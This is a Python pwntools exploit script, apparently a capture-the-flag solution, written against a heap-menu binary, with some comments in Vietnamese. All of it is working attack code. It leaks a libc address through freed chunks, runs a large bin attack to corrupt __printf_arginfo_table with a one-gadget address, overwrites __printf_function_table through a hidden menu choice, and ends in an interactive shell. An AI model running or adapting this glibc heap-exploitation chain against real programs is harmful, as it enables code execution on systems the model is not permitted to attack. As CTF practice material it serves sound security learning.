#!/usr/bin/python3

from pwn import *

exe = ELF('pwn_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # brva 0x1D98

        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
def cr(name,len, context):
    sla(b'choice:', '1')
    sla(b'name:', name)
    sla(b'length of your desciption: ', str(len))
    sla(b'content of your desciption: ', context)
def de(idx):
    sla(b'choice:', '2')
    sla(b'people:', str(idx))
def ed(idx,name, context):
    sla(b'choice:', '3')
    sla(b'people:', str(idx))
    sla(b'name of the people: ', name)
    sla(b'content of the desciption: ', context)
def sh(idx):
    sla(b'choice:', '4')
    sla(b'people: ', str(idx))
    

GDB()
# leak libc
cr(b'name0', 0x520, b'context0')    # 0
cr(b'wan', 0x500, b'wan')           # 1
de(0)
cr(b'wan', 0x540, b'wan')           # 2
sh(0)
libc.address = u64(p.recv(8)) - 0x1ed010
info("libc.address: " + hex(libc.address))
fun = libc.address + 0x1f1318
arg = libc.address + 0x1ed7b0

# đưa 3 vào large bin
cr(b'wan', 0x520, b'wan')           # 0
# chuẩn bị cho __printf_arginfo_table[0x73] 
cr(b'wan', 0x510, p64(0xe3afe+libc.address)*0x73)   # 3
de(3)
cr(b'wan', 0x540, b'wan')           # 4
de(4)
# overwrite chunk_0[3] = __printf_arginfo_table, 
# nếu large bin attack thành công, sẽ đưa được địa chỉ chunk_0 vào __printf_arginfo_table
ed(0,b'wan', p64(libc.address+0x1ed010)*3 + p64(arg-0x20))
# đưa 4 vào large bin
cr(b'wan', 0x540, b'wan')
# overwrite __printf_function_table để không NULL
sa(b'choice:', b'255')
p.sendlineafter(b"Maybe Do you like IU?\n",b"y")
p.sendlineafter(b"Give you a reward!\n",p64(fun) + b'w')
# sleep(0.5)

p.sendlineafter("choice:",b"1337")

p.interactive()
